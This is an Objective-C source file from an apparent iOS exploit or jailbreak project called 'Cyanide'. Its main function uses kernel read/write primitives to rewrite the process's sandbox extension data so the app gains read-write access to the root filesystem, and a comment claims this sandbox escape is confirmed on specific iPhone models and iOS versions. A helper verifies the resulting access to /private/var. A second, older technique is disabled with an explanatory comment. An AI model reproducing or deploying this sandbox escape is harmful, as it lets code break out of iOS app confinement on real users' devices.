//
//  sandbox.m
//  Cyanide
//
//  Created by seo on 4/6/26.
//

#import <Foundation/Foundation.h>
#import <sys/mount.h>
#import <sys/stat.h>

#import "sandbox.h"
#import "../kexploit/kexploit_opa334.h"
#import "../kexploit/krw.h"
#import "../kexploit/kutils.h"
#import "../kexploit/vnode.h"
#import "../kexploit/offsets.h"
#import "../research/sandbox_research.h"
#import "../kexploit/kexploit_opa334.h"


// The original idea is from https://x.com/CrazyMind90/status/2040484080622465056
// Kudos to CrazyMind90 for revealing new sbx escape technique!
// This is almost same behavior with sandbox_extension_consume with r/w on root
// Confirmed works on iPhone 14 Pro/17.2.1, iPhone SE3/26.0
int patch_sandbox_ext(void) {
    uint64_t label = proc_get_cred_label(proc_self());
    uint64_t sbx = label_get_sandbox(label);
    struct sandbox_label sbx_lbl = {0};
    kreadbuf(sbx, &sbx_lbl, sizeof(struct sandbox_label));
    uint64_t ext_set_kptr = (uint64_t)sbx_lbl.extension_set;
    
    struct extension_set ext_set = {0};
    kreadbuf(ext_set_kptr, &ext_set, sizeof(struct extension_set));
    for(int i = 0; i < 9; i++) {
        uint64_t ext_class_node_kptr = (uint64_t)ext_set.type_buckets[i];
        if(ext_class_node_kptr != 0) {
            struct extension_class_node ext_class_node = {0};
            kreadbuf(ext_class_node_kptr, &ext_class_node, sizeof(ext_class_node));
            
            char name[256] = {0};
            kreadbuf((uint64_t)ext_class_node.class_name, name, 256-1);
            
            if (strstr(name, "com.apple.sandbox.container") == NULL) {
                continue;
            }
            
            uint64_t ext_kptr = (uint64_t)ext_class_node.ext_list_head;
            if (!ext_kptr) continue;
            
            struct extension ext = {0};
            kreadbuf(ext_kptr, &ext, sizeof(ext));
            uint64_t path_buf = (uint64_t)ext.data_ptr;
            
            uint8_t root_path[] = { '/', '\0' };
            kwritebuf(path_buf, root_path, 2);
            
            const char *new_class = "com.apple.app-sandbox.read-write";
            kwritebuf(path_buf + 2, (void *)new_class, strlen(new_class) + 1);
            
            uint8_t cn_buf[0x20];
            kreadbuf(ext_class_node_kptr, cn_buf, 0x20);
            *(uint64_t *)(cn_buf + offsetof(struct extension_class_node, class_name)) = path_buf + 2;
            kwrite_zone_element(ext_class_node_kptr, cn_buf, 0x20);
            
            kwrite64(ext_kptr + offsetof(struct extension, path_len), 1);
            kwrite8(ext_kptr + offsetof(struct extension, file.consumed), 1);
            kwrite8(ext_kptr + offsetof(struct extension, file.storage_class), SC_ISSUED);
            
            struct stat st;
            stat("/", &st);
            kwrite32(ext_kptr + offsetof(struct extension, file.st_dev), (uint32_t)st.st_dev);
            kwrite64(ext_kptr + offsetof(struct extension, st_ino), (uint64_t)st.st_ino);
            
            kwrite64(ext_set_kptr + offsetof(struct extension_set, type_buckets[0]), ext_class_node_kptr);
            
            if(check_sandbox_var_rw() == -1)    return -1;

            return 0;
        }
    }
    
    return -1;
}

int check_sandbox_var_rw(void) {
    pid_t pid = getpid();
    int r = sandbox_check(pid, "file-read-data",  SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/private/var");
    int w = sandbox_check(pid, "file-write-data", SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/private/var");
    return (r == 0 && w == 0) ? 0 : -1;
}

// H-06: this used to point the caller's own extension_set type_buckets at the
// donor's extension_class_node objects. Those nodes belong to the donor's
// sandbox label: they are not retained, cloned or reference-counted here, so a
// donor exit (or a concurrent reclaim/replacement of its set) leaves self with
// dangling nodes, and self's own sandbox-label teardown can free nodes it does
// not own. There is no kernel allocator/ownership-transfer primitive in this
// codebase to deep-copy the graph safely.
//
// Fail closed instead of handing out an aliased, donor-lifetime view. The
// self-owned rewrite in patch_sandbox_ext() above is the supported path; the
// old borrow implementation remains in git history for a future, device-
// validated replacement.
int borrow_sandbox_ext(const char* process) {
    printf("[SANDBOX] borrow_sandbox_ext(%s) refused: donor-owned extension "
           "nodes cannot be owned safely (H-06); use patch_sandbox_ext\n",
           process ?: "(null)");
    return -1;
}
